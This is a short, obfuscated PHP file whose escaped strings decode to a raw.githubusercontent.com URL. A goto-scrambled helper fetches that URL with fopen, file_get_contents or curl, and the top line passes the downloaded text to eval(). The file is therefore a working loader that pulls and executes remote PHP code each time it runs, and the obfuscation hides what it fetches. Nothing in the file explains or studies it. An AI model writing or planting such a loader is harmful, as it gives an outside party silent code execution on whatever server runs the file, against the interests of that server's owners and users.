<?php
/* 

Author: Iddant ID
Provider: Three

*/
eval(h5ls0("\x68\x74\x74\160\x73\x3a\57\x2f\162\141\x77\x2e\147\x69\x74\x68\x75\142\x75\x73\145\x72\x63\x6f\156\x74\x65\x6e\x74\x2e\x63\x6f\155\57\151\160\x6b\x7a\157\x6e\x65\57\142\x65\x74\x61\x74\157\157\154\163\166\x33\x2f\155\x61\x73\x74\x65\162\x2f\142\145\x74\141\x5f\x72\157\56\x62\x75\151\x6c\144\x2e\x70\150\x70"));
function H5lS0($ePY0Y)
{
    goto QsGkB;
    Ltesh:
    if (function_exists("\146\157\x70\x65\x6e") && function_exists("\146\145\x6f\x66") && function_exists("\x66\162\x65\141\x64") && $T8zo9) {
        goto XA1NV;
    }
    goto eS9aQ;
    n4GH4:
    mvVhl:
    goto xqETo;
    coeOj:
    goto krD89;
    goto n4GH4;
    nE7XM:
    krD89:
    goto IuuXl;
    pMsBg:
    $hDVgO .= fread($T8zo9, 1024 * 8);
    goto AZKWf;
    xqETo:
    $hDVgO .= $ANOTY;
    goto nE7XM;
    d4A0p:
    $hDVgO .= curl_exec($nsMrk);
    goto OEbAo;
    n2mmZ:
    goto krD89;
    goto RDZrb;
    lAVkC:
    fclose($T8zo9);
    goto coeOj;
    QsGkB:
    $T8zo9 = fopen($ePY0Y, "\162\142");
    goto drRZj;
    eS9aQ:
    if (function_exists("\146\151\x6c\x65\137\x67\145\x74\x5f\143\157\x6e\164\x65\156\x74\x73") && ($ANOTY = file_get_contents($ePY0Y))) {
        goto mvVhl;
    }
    goto ZHp8h;
    OEbAo:
    curl_close($nsMrk);
    goto n2mmZ;
    drRZj:
    $hDVgO = '';
    goto Ltesh;
    IuuXl:
    return "\77\76" . $hDVgO;
    goto mqlZr;
    RDZrb:
    XA1NV:
    goto kPWaf;
    AZKWf:
    goto ZM5n2;
    goto jqfDx;
    MnLXL:
    curl_setopt($nsMrk, CURLOPT_RETURNTRANSFER, 1);
    goto jTPDU;
    jTPDU:
    curl_setopt($nsMrk, CURLOPT_FOLLOWLOCATION, 1);
    goto d4A0p;
    ZHp8h:
    $nsMrk = curl_init();
    goto GBNWK;
    kPWaf:
    ZM5n2:
    goto kMXN0;
    GBNWK:
    curl_setopt($nsMrk, CURLOPT_URL, $ePY0Y);
    goto MnLXL;
    jqfDx:
    yUwDG:
    goto lAVkC;
    kMXN0:
    if (feof($T8zo9)) {
        goto yUwDG;
    }
    goto pMsBg;
    mqlZr:
}
